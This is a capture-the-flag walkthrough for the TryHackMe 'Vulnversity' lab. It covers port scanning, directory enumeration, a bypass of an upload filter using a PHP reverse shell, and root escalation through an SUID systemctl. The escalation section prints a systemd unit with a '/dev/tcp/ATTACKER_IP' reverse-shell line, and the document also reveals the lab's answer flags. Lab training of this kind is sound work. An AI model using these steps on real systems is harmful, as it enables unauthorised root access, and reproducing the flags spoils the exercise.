---
description: Learn about active recon, web app attacks and privilege escalation.
---

# 🧑🚀 Vulnversity

{% embed url="https://tryhackme.com/room/vulnversity" %}
[https://tryhackme.com/room/vulnversity](https://tryhackme.com/room/vulnversity)
{% endembed %}

| Room Attributes       | Value                                                                   |
| --------------------- | ----------------------------------------------------------------------- |
| Subscription Required |  <mark style="color:green;background-color:green;">False</mark> \[Free] |
| Type                  | Walkthrough                                                             |
| Difficulty            |  <mark style="color:green;background-color:green;">Easy</mark>          |
| Tags                  | Recon, PrivEsc, WebAppSec, Video                                        |

## Task 1 - Deploy the machine

### Deploy the machine

{% hint style="success" %}
No answer needed
{% endhint %}

## Task 2 - Reconnaissance

### There are many nmap "cheatsheets" online that you can use too.

{% hint style="success" %}
No answer needed
{% endhint %}

### Scan the box, how many ports are open?

```
rustscan -b 500 -a 10.10.86.148 --range 1-10000
```

```
Completed Connect Scan at 00:10, 0.15s elapsed (6 total ports)
```

<details>

<summary>Reveal Flag <span data-gb-custom-inline data-tag="emoji" data-code="1f6a9">🚩</span></summary>

:triangular\_flag\_on\_post:`6`

</details>

### What version of the squid proxy is running on the machine?

```
rustscan -b 500 -a 10.10.86.148 --range 1-10000 -- -sV
```

```
PORT     STATE SERVICE     REASON  VERSION
21/tcp   open  ftp         syn-ack vsftpd 3.0.3
22/tcp   open  ssh         syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
139/tcp  open  netbios-ssn syn-ack Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn syn-ack Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
3128/tcp open  http-proxy  syn-ack Squid http proxy 3.5.12
3333/tcp open  http        syn-ack Apache httpd 2.4.18 ((Ubuntu))
```

<details>

<summary>Reveal Flag <span data-gb-custom-inline data-tag="emoji" data-code="1f6a9">🚩</span></summary>

:triangular\_flag\_on\_post:`3.5.12`

</details>

### How many ports will nmap scan if the flag **-p-400** was used?

<details>

<summary>Reveal Flag <span data-gb-custom-inline data-tag="emoji" data-code="1f6a9">🚩</span></summary>

:triangular\_flag\_on\_post:`400`

</details>

### Using the nmap flag **-n** what will it not resolve?

{% hint style="warning" %}
**HINT:** IP to hostname
{% endhint %}

{% embed url="https://nmap.org/book/man-briefoptions.html" %}
[https://nmap.org/book/man-briefoptions.html](https://nmap.org/book/man-briefoptions.html)
{% endembed %}

<details>

<summary>Reveal Flag <span data-gb-custom-inline data-tag="emoji" data-code="1f6a9">🚩</span></summary>

:triangular\_flag\_on\_post:`dns`

</details>

### What is the most likely operating system this machine is running?

{% hint style="warning" %}
**HINT:** Run nmap with the -O flag
{% endhint %}

```
22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
3333/tcp open  http        Apache httpd 2.4.18 ((Ubuntu))
```

<details>

<summary>Reveal Flag <span data-gb-custom-inline data-tag="emoji" data-code="1f6a9">🚩</span></summary>

:triangular\_flag\_on\_post:`ubuntu`

</details>

### What port is the web server running on?

```
3333/tcp open  http        Apache httpd 2.4.18 ((Ubuntu))
```

<details>

<summary>Reveal Flag <span data-gb-custom-inline data-tag="emoji" data-code="1f6a9">🚩</span></summary>

:triangular\_flag\_on\_post:`3333`

</details>

### Its important to ensure you are always doing your reconnaissance thoroughly before progressing. Knowing all open services (which can all be points of exploitation) is very important, don't forget that ports on a higher range might be open so always scan ports after 1000 (even if you leave scanning in the background)

{% hint style="success" %}
No answer needed
{% endhint %}

## Task 3 **-** Locating directories using GoBuster

### Now lets run GoBuster with a wordlist: **gobuster dir -u http://\<ip>:3333 -w \<word list location>**

```
gobuster dir -u http://TARGET_IP:3333/ -w /usr/share/wordlists/dirb/common.txt
```

{% hint style="success" %}
No answer needed
{% endhint %}

### What is the directory that has an upload form page?

```
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.86.148:3333/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/06/26 01:37:30 Starting gobuster in directory enumeration mode
===============================================================
...
/internal             (Status: 301) [Size: 322] [--> http://10.10.86.148:3333/internal/]
```

![upload form page](../.gitbook/assets/Screenshot\_2022-06-26\_01-41-04.png)

<details>

<summary>Reveal Flag <span data-gb-custom-inline data-tag="emoji" data-code="1f6a9">🚩</span></summary>

:triangular\_flag\_on\_post:`/internal/`

</details>

## Task 4 - Compromise the webserver

### Try upload a few file types to the server, what common extension seems to be blocked?

<details>

<summary>Reveal Flag <span data-gb-custom-inline data-tag="emoji" data-code="1f6a9">🚩</span></summary>

:triangular\_flag\_on\_post:`.php`

</details>

### To identify which extensions are not blocked, we're going to fuzz the upload form. To do this, we're going to use **BurpSuite.** If you are unsure to what BurpSuite is, or how to set it up please complete our [BurpSuite room](../difficulty-info/burp-suite/) first.

{% hint style="success" %}
No answer needed
{% endhint %}

### Run this attack, what extension is allowed?

<details>

<summary>Reveal Flag <span data-gb-custom-inline data-tag="emoji" data-code="1f6a9">🚩</span></summary>

:triangular\_flag\_on\_post:`.phtml`

</details>

### Upload your shell and navigate to **http://\<ip>:3333/internal/uploads/php-reverse-shell.phtml.** You should see a connection on your netcat session

{% hint style="success" %}
No answer needed
{% endhint %}

### What is the name of the user who manages the webserver?

```
nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.9.12.198] from (UNKNOWN) [10.10.86.148] 45426
Linux vulnuniversity 4.4.0-142-generic #168-Ubuntu SMP Wed Jan 16 21:00:45 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
 21:03:07 up 54 min,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
bash: cannot set terminal process group (1345): Inappropriate ioctl for device
bash: no job control in this shell
www-data@vulnuniversity:/$ 
```

```
www-data@vulnuniversity:/home$ ls
bill
```

<details>

<summary>Reveal Flag <span data-gb-custom-inline data-tag="emoji" data-code="1f6a9">🚩</span></summary>

:triangular\_flag\_on\_post:`bill`

</details>

### What is the user flag?

{% hint style="warning" %}
**HINT:** The contents of the file /home/bill/user.txt
{% endhint %}

```
www-data@vulnuniversity:/home/bill$ cat user.txt
cat user.txt
(reveal flag below)
```

<details>

<summary>Reveal Flag <span data-gb-custom-inline data-tag="emoji" data-code="1f6a9">🚩</span></summary>

:triangular\_flag\_on\_post:`8bd7992fbe8a6ad22a63361004cfcedb`

</details>

## Task 5 - Privilege Escalation

### On the system, search for all SUID files. What file stands out?

{% hint style="warning" %}
**HINT:** Use the command: find / -user root -perm -4000 -exec ls -ldb {} ;
{% endhint %}

```
find / -perm -u=s -type f 2>/dev/null
```

```
/usr/bin/newuidmap
/usr/bin/chfn
/usr/bin/newgidmap
/usr/bin/sudo
/usr/bin/chsh
/usr/bin/passwd
/usr/bin/pkexec
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/at
/usr/lib/snapd/snap-confine
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/squid/pinger
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/bin/su
/bin/ntfs-3g
/bin/mount
/bin/ping6
/bin/umount
/bin/systemctl
/bin/ping
/bin/fusermount
/sbin/mount.cifs
```

<details>

<summary>Reveal Flag <span data-gb-custom-inline data-tag="emoji" data-code="1f6a9">🚩</span></summary>

:triangular\_flag\_on\_post:`/bin/systemctl`

</details>

### Its challenge time! We have guided you through this far, are you able to exploit this system further to escalate your privileges and get the final answer? Become root and get the last flag (/root/root.txt)

{% hint style="warning" %}
**HINT:** /bin/systemctl
{% endhint %}

{% embed url="https://medium.com/@klockw3rk/privilege-escalation-leveraging-misconfigured-systemctl-permissions-bc62b0b28d49" %}
[https://medium.com/@klockw3rk/privilege-escalation-leveraging-misconfigured-systemctl-permissions-bc62b0b28d49](https://medium.com/@klockw3rk/privilege-escalation-leveraging-misconfigured-systemctl-permissions-bc62b0b28d49)
{% endembed %}

Find a directory that www-data can write to:

```
find / -type f -maxdepth 2 -writable
find / -type d -maxdepth 2 -writable
```

```
www-data@vulnuniversity:/tmp$ find / -type d -maxdepth 2 -writable
find / -type d -maxdepth 2 -writable
/run/php
/run/lock
find: '/lost+found': Permission denied
/var/tmp
/var/crash
/tmp
/tmp/.font-unix
/tmp/.ICE-unix
/tmp/.X11-unix
/tmp/.XIM-unix
/tmp/.Test-unix
/dev/mqueue
/dev/shm
```

Create a `root.service` file on your attack machine:

```
[Unit]
Description=rootservice

[Service]
Type=simple
User=root
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/9999 0>&1'

[Install]
WantedBy=multi-user.target

```

Get the target to listen for a connection to receive and write the `root.service` file to /tmp:

```
www-data@vulnuniversity:$ cd /tmp
www-data@vulnuniversity:/tmp$ nc -vl 6969 > root.service
```

Send the file from your attack machine to the target:

```
kali@kali  ~/Documents/THM/vulnversity  nc -n TARGET_IP 6969 < root.service
```

Then start a new listener to capture the root reverse shell:

```
kali@kali  ~/Documents/THM/vulnversity  nc -lvnp 9999
```

Execute the payload:

```
www-data@vulnuniversity:/tmp$ /bin/systemctl enable /tmp/root.service
Created symlink from /etc/systemd/system/multi-user.target.wants/root.service to /tmp/root.service.
Created symlink from /etc/systemd/system/root.service to /tmp/root.service.
```

```
www-data@vulnuniversity:/tmp$ /bin/systemctl start root
```

Catch the root reverse shell on your attack machine:

```
kali@kali  ~/Documents/THM/vulnversity  nc -lvnp 9999                          
listening on [any] 9999 ...
connect to [10.9.12.198] from (UNKNOWN) [10.10.86.148] 45598
bash: cannot set terminal process group (2162): Inappropriate ioctl for device
bash: no job control in this shell
root@vulnuniversity:/# whoami
root
```

Read the root flag:

```
root@vulnuniversity:~# cat /root/root.txt
cat root.txt
(reveal flag below)
```

<details>

<summary>Reveal Flag <span data-gb-custom-inline data-tag="emoji" data-code="1f6a9">🚩</span></summary>

:triangular\_flag\_on\_post:`a58ff8579f0a9270368d33a9966c7fd5`

</details>
